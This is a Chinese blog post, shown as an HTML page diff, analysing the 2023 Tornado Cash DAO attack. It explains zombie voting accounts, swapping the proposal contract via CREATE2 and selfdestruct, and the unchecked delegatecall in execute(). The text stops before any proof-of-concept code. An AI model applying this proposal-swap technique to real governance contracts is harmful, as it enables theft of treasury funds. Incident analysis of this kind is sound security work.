@@ -1,0 +1,1303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiu">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/05/15/tornado cash dao攻击总结/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Slides 一、事件背景2023 年 5 月 20 日，去中心化隐私协议 Tornado Cash 的治理模块（DAO）遭遇了攻击。攻击者通过提交恶意治理提案，绕过权限控制，成功窃取了约 47.3 万枚 TORN（治理代币）。  二、Tornado Cash 的系统组成理解本次攻击的前提，需要区分 Tornado Cash 的两个关键组成部分： 1. 核心混币合约（Mixing Protocol">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tornado Cash DAO Incident分析与POC">
+<meta property="og:url" content="http://example.com/2025/05/15/Tornado%20Cash%20DAO%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Slides 一、事件背景2023 年 5 月 20 日，去中心化隐私协议 Tornado Cash 的治理模块（DAO）遭遇了攻击。攻击者通过提交恶意治理提案，绕过权限控制，成功窃取了约 47.3 万枚 TORN（治理代币）。  二、Tornado Cash 的系统组成理解本次攻击的前提，需要区分 Tornado Cash 的两个关键组成部分： 1. 核心混币合约（Mixing Protocol">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image.png">
+<meta property="og:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%201.png">
+<meta property="og:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%202.png">
+<meta property="og:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%203.png">
+<meta property="og:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%204.png">
+<meta property="article:published_time" content="2025-05-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-14T09:08:13.528Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="区块链">
+<meta property="article:tag" content="DeFi">
+<meta property="article:tag" content="攻击事件分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Tornado Cash DAO Incident分析与POC | Chiu&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Input | Think | Output","subtitle":{"text":["How you spend every day is how you spend your life"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Idealist17","instagram":null,"zhihu":null,"twitter":null,"email":"ChiuFangxi@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Gallery":{"icon":"fa-solid fa-image","path":"/masonry/"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/friends"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Input | Think | Output","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/7/30 14:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":true};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Chiu&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/masonry/"
+                                        >
+                                    <i class="fa-solid fa-image fa-fw"></i>
+                                    GALLERY
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/friends">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/masonry/"
+                        >
+                            <span>
+                                GALLERY
+                            </span>
+                            
+                                <i class="fa-solid fa-image fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/friends">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">35</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Tornado Cash DAO Incident分析与POC</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Chiu</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-05-15</span>
+        <span class="mobile">2025-05-15</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-14 17:08:13</span>
+            <span class="mobile">2025-07-14 17:08:13</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/DeFi/">DeFi</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">攻击事件分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p><strong><a class="link"   target="_blank" rel="noopener" href="https://gamma.app/docs/Tornado-Cash-DAO--9unstetg6fpx46m" >Slides<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></p>
+<h2 id="一、事件背景"><a href="#一、事件背景" class="headerlink" title="一、事件背景"></a>一、事件背景</h2><p>2023 年 5 月 20 日，去中心化隐私协议 Tornado Cash 的治理模块（DAO）遭遇了攻击。攻击者通过提交恶意治理提案，绕过权限控制，成功窃取了约 47.3 万枚 TORN（治理代币）。</p>
+<hr>
+<h2 id="二、Tornado-Cash-的系统组成"><a href="#二、Tornado-Cash-的系统组成" class="headerlink" title="二、Tornado Cash 的系统组成"></a>二、Tornado Cash 的系统组成</h2><p>理解本次攻击的前提，需要区分 Tornado Cash 的两个关键组成部分：</p>
+<h3 id="1-核心混币合约（Mixing-Protocol）"><a href="#1-核心混币合约（Mixing-Protocol）" class="headerlink" title="1. 核心混币合约（Mixing Protocol）"></a>1. 核心混币合约（Mixing Protocol）</h3><ul>
+<li>这是部署在以太坊主网的不可变智能合约，例如 ETH 混币池。</li>
+<li>用户可以通过零知识证明机制实现匿名存取款。</li>
+<li>合约设计不可升级，不依赖治理合约控制，运行逻辑完全链上验证。</li>
+<li>历史上，攻击者广泛使用此类合约来匿名洗钱。</li>
+</ul>
+<h3 id="2-Tornado-Cash-DAO（治理合约）"><a href="#2-Tornado-Cash-DAO（治理合约）" class="headerlink" title="2. Tornado Cash DAO（治理合约）"></a>2. Tornado Cash DAO（治理合约）</h3><ul>
+<li>负责管理 Tornado 的发展和金库资金使用。</li>
+<li>基于 TORN 代币投票权，用户可以发起提案并执行操作。</li>
+<li>拥有 <code>execute()</code> 权限的合约可在提案通过后执行一系列治理行为，包括资金转移、合约调用等。</li>
+</ul>
+<hr>
+<h2 id="三、攻击流程详解"><a href="#三、攻击流程详解" class="headerlink" title="三、攻击流程详解"></a>三、攻击流程详解</h2><p>攻击者的整个操作流程可以分为以下几个阶段：</p>
+<h3 id="1-准备阶段：创建僵尸账户"><a href="#1-准备阶段：创建僵尸账户" class="headerlink" title="1. 准备阶段：创建僵尸账户"></a>1. 准备阶段：创建僵尸账户</h3><ul>
+<li>攻击者预先创建了大约 100 个“僵尸账户”，由于 Tornado 的治理合约中的投票权逻辑只判断了**用户是否调用了 lock() 函数并登记了 <code>unlockTime</code>**，并没有校验其实际锁仓 TORN 数量，每个账户都通过锁仓 0 TORN 获得一个投票凭证。</li>
+<li>每个账户都成为 <code>Proposal.lockedBalance</code> 结构中的一员，使其在治理系统中存在。</li>
+</ul>
+<h3 id="2-构造并提交恶意治理提案"><a href="#2-构造并提交恶意治理提案" class="headerlink" title="2. 构造并提交恶意治理提案"></a>2. 构造并提交恶意治理提案</h3><ul>
+<li>攻击者首先部署MetaDeployer合约，并通过CREATE2函数部署Factory合约到A地址，Factory合约调用CREATE函数将提案合约部署到B地址。</li>
+<li>攻击者提交此恶意提案（Proposal Id &#x3D; 20），其内容包含一个不容易引起察觉的<code>emergencyStop()</code>函数 。</li>
+<li>提案通过后，攻击者调用自毁函数销毁了提案合约与Factory合约。</li>
+<li>MetaDeployer在使用相同字节码与salt的情况下，CREATE2仍会部署Factory合约到A地址</li>
+<li>由于Factory合约被销毁过，nonce置零，所以再次使用CREATE部署提案合约时仍部署到B地址，不过这次部署的是攻击合约</li>
+</ul>
+<h3 id="3-利用-delegatecall-篡改投票权与权限"><a href="#3-利用-delegatecall-篡改投票权与权限" class="headerlink" title="3. 利用 delegatecall 篡改投票权与权限"></a>3. 利用 delegatecall 篡改投票权与权限</h3><ul>
+<li>治理合约调用提案合约函数的方式是<code>execute（）</code>函数中的<code>delegatecall</code>，并且没有对合约校验hash或者验签，只需传入提案ID：</li>
+</ul>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line">governance.sol治理合约下的execute()函数</span><br><span class="line">https://etherscan.io/address/0xa9689ed4a82a288e267b11ae8fe137fb4cb2177e#code</span><br><span class="line">*/</span><br><span class="line">function execute(uint256 proposalId) external payable virtual &#123;</span><br><span class="line">    require(state(proposalId) == ProposalState.AwaitingExecution, &quot;Governance::execute: invalid proposal state&quot;);</span><br><span class="line">    Proposal storage proposal = proposals[proposalId];</span><br><span class="line">    proposal.executed = true;</span><br><span class="line"></span><br><span class="line">    address target = proposal.target;</span><br><span class="line">    require(Address.isContract(target), &quot;Governance::execute: not a contract&quot;);</span><br><span class="line">    (bool success, bytes memory data) = target.delegatecall(abi.encodeWithSignature(&quot;executeProposal()&quot;));</span><br><span class="line">    if (!success) &#123;</span><br><span class="line">      if (data.length &gt; 0) &#123;</span><br><span class="line">        revert(string(data));</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        revert(&quot;Proposal execution failed&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit ProposalExecuted(proposalId);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><p>攻击合约通过delegate call修改了每个僵尸账户的<code>lockedBalance</code>，赋予每个账户 10,000 的“伪造余额”，此时攻击者已经拥有了DAO的治理控制权。</p>
+<p>  <a class="link"   target="_blank" rel="noopener" href="https://app.blocksec.com/explorer/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d" >交易链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>  lockedBalance变化：</p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image.png"
+                      alt="image.png"
+                ></p>
